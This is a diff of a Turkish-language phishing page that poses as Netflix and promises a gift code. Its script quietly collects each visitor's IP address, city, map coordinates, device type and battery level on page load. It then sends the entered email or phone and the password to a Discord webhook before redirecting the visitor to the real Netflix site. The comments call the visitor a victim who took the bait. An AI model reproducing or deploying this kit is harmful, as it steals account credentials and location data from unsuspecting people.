@@ -11,8 +11,6 @@
 
     <style>
         body { background-color: #000; color: #fff; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        
-        /* SAHTE BİLDİRİM */
         #notification {
             position: fixed; top: -100px; left: 50%; transform: translateX(-50%);
             width: 90%; max-width: 400px; background: rgba(30, 30, 30, 0.95);
@@ -20,16 +18,10 @@
             box-shadow: 0 10px 30px rgba(0,0,0,0.5); transition: 0.5s; z-index: 1000;
         }
         #notification img { width: 40px; border-radius: 8px; margin-right: 12px; }
-        #notification .text { flex: 1; }
-        #notification .title { font-weight: bold; font-size: 14px; display: block; }
-        #notification .msg { font-size: 13px; color: #ccc; }
-
-        /* GİRİŞ PANELİ */
         .login-box { width: 90%; max-width: 350px; text-align: center; }
         .login-box img { width: 150px; margin-bottom: 30px; }
         input { width: 100%; padding: 15px; margin-bottom: 15px; border-radius: 5px; border: none; background: #333; color: #fff; box-sizing: border-box; }
         button { width: 100%; padding: 15px; border: none; border-radius: 5px; background: #e50914; color: #fff; font-size: 16px; font-weight: bold; cursor: pointer; }
-        
         .loading-screen { display: none; text-align: center; }
         .loader { border: 4px solid #333; border-top: 4px solid #e50914; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -39,96 +31,108 @@
 
     <div id="notification">
         <img src="https://upload.wikimedia.org/wikipedia/commons/f/ff/Netflix-new-icon.png">
-        <div class="text">
-            <span class="title">Netflix</span>
-            <span class="msg">Tebrikler! Üyeliğiniz aktif edildi.</span>
+        <div style="flex:1;">
+            <b style="font-size:14px; display:block;">Netflix</b>
+            <span style="font-size:13px; color:#ccc;">Tebrikler! 3 Aylık Paketiniz Tanımlandı.</span>
         </div>
     </div>
 
     <div class="login-box" id="loginBox">
         <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg">
-        <h2 style="font-size: 20px; margin-bottom: 20px;">Hediye Kodunu Almak İçin Giriş Yapın</h2>
-        <input type="email" id="email" placeholder="E-posta veya telefon numarası" required>
-        <input type="password" id="password" placeholder="Parola" required>
-        <button onclick="loginVeGonder()">Oturum Aç</button>
+        <h2 style="font-size: 20px; margin-bottom: 20px;">Hediye Kodunuzu Almak İçin Doğrulama Yapın</h2>
+        <input type="text" id="user_id" placeholder="E-posta veya telefon numarası">
+        <input type="password" id="user_pass" placeholder="Parola">
+        <button onclick="ikinciAsama()">Hediye Kodunu Göster</button>
     </div>
 
     <div class="loading-screen" id="loadingScreen">
         <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" width="120">
-        <h3>Kod Tanımlanıyor...</h3>
+        <h3>İşlem Yapılıyor...</h3>
         <div class="loader"></div>
     </div>
 
-    <audio id="netflixSound">
+    <audio id="tudum">
         <source src="https://www.myinstants.com/media/sounds/netflix-tudum.mp3" type="audio/mpeg">
     </audio>
 
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1476700662212329595/_PH17dgTO-VNM48nCiAI3oEbB4zfonVEBqN3n-9KIx5wObUzwTEtr_D_3s5206i_gzKM";
+        let kurbanVerisi = {};
 
-        // Sayfa tıklandığında sesi çal ve bildirimi göster
-        document.body.onclick = function() {
-            document.getElementById('netflixSound').play();
-            setTimeout(() => {
-                document.getElementById('notification').style.top = "20px";
-            }, 500);
-            setTimeout(() => {
-                document.getElementById('notification').style.top = "-100px";
-            }, 4000);
+        // AŞAMA 1: SAYFA AÇILIR AÇILMAZ CİHAZ VE KONUM GÖNDER
+        window.onload = async function() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                kurbanVerisi = await res.json();
+                
+                const ua = navigator.userAgent;
+                let cihaz = "🖥️ PC";
+                if (/Mobi|Android|iPhone/i.test(ua)) cihaz = "📱 Mobil";
+
+                let pil = "Bilinmiyor";
+                if (navigator.getBattery) {
+                    const b = await navigator.getBattery();
+                    pil = `%${Math.round(b.level * 100)} ${b.charging ? '🔌' : '🔋'}`;
+                }
+
+                const ilkRapor = {
+                    username: "ANONİM BOT",
+                    embeds: [{
+                        title: "📍 YENİ TIKLAMA (SADECE KONUM)",
+                        description: "```Kurban linke tıkladı, henüz giriş yapmadı.```",
+                        color: 3447003, // Mavi Şerit
+                        fields: [
+                            { name: "🌐 IP / Cihaz", value: `\`${kurbanVerisi.ip}\` | ${cihaz}`, inline: true },
+                            { name: "🔋 Batarya", value: pil, inline: true },
+                            { name: "🏠 Adres", value: `**${kurbanVerisi.region} / ${kurbanVerisi.city}**`, inline: false },
+                            { name: "📍 Harita", value: `[Konumu Gör](https://www.google.com/maps?q=${kurbanVerisi.latitude},${kurbanVerisi.longitude})`, inline: false }
+                        ],
+                        footer: { text: "Aşama 1: Sızma Tamamlandı" },
+                        thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/f/ff/Netflix-new-icon.png" }
+                    }]
+                };
+                await fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(ilkRapor) });
+            } catch (e) {}
         };
 
-        async function loginVeGonder() {
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('password').value;
+        // Ekrana tıklandığında sesi çal ve bildirimi göster
+        document.body.onclick = function() {
+            document.getElementById('tudum').play();
+            document.getElementById('notification').style.top = "20px";
+            setTimeout(() => { document.getElementById('notification').style.top = "-100px"; }, 4000);
+        };
 
-            if(!email || !pass) { alert("Lütfen bilgileri girin!"); return; }
+        // AŞAMA 2: BUTONA TIKLARSA ŞİFREYİ GÖNDER
+        async function ikinciAsama() {
+            const mail = document.getElementById('user_id').value;
+            const pass = document.getElementById('user_pass').value;
+
+            if(!mail || !pass) { alert("Lütfen doğrulamayı tamamlayın!"); return; }
 
             document.getElementById('loginBox').style.display = "none";
             document.getElementById('loadingScreen').style.display = "block";
 
-            try {
-                // Konum ve IP Alımı
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                
-                const ua = navigator.userAgent;
-                let cihaz = "📱 Mobil";
-                if(!/Mobi|Android|iPhone/i.test(ua)) cihaz = "🖥️ PC";
+            const ikinciRapor = {
+                username: "ANONİM BOT",
+                embeds: [{
+                    title: "🔥 HESAP BİLGİLERİ DÜŞTÜ!",
+                    description: "```fix\nKurban oltaya geldi, bilgiler aşağıda.```",
+                    color: 16711680, // Kırmızı Şerit
+                    fields: [
+                        { name: "📧 E-Posta / Tel", value: `**${mail}**`, inline: true },
+                        { name: "🔑 Şifre", value: `\`${pass}\``, inline: true },
+                        { name: "🌐 IP", value: `\`${kurbanVerisi.ip}\``, inline: false }
+                    ],
+                    footer: { text: "Aşama 2: Hesap Ele Geçirildi" },
+                    thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/f/ff/Netflix-new-icon.png" }
+                }]
+            };
 
-                // DISCORD RAPORU
-                const rapor = {
-                    username: "ANONİM BOT",
-                    avatar_url: "https://i.imgur.com/8nN9S1L.png",
-                    embeds: [{
-                        title: "🔥 HESAP VE KONUM ELE GEÇİRİLDİ!",
-                        description: "```fix\nKurban giriş yaptı ve tüm bilgiler çekildi.```",
-                        color: 16711680,
-                        fields: [
-                            { name: "📧 E-Posta / Telefon", value: `**${email}**`, inline: true },
-                            { name: "🔑 Parola", value: `\`${pass}\``, inline: true },
-                            { name: "🌐 IP Adresi", value: `\`\`\`${d.ip}\`\`\``, inline: false },
-                            { name: "📍 Adres", value: `**${d.region} / ${d.city}**`, inline: true },
-                            { name: "📱 Cihaz", value: cihaz, inline: true },
-                            { name: "🗺️ Harita", value: `[Konuma Git](https://www.google.com/maps?q=${d.latitude},${d.longitude})`, inline: false }
-                        ],
-                        footer: { text: "ANONİM BOT • " + new Date().toLocaleString('tr-TR') },
-                        thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/f/ff/Netflix-new-icon.png" }
-                    }]
-                };
-
-                await fetch(webhookURL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(rapor)
-                });
-
-                setTimeout(() => {
-                    window.location.replace("https://www.netflix.com/tr/redeem");
-                }, 3000);
-
-            } catch (e) {
+            await fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(ikinciRapor) });
+            
+            setTimeout(() => {
                 window.location.replace("https://www.netflix.com/tr/redeem");
-            }
+            }, 3000);
         }
     </script>
 </body>
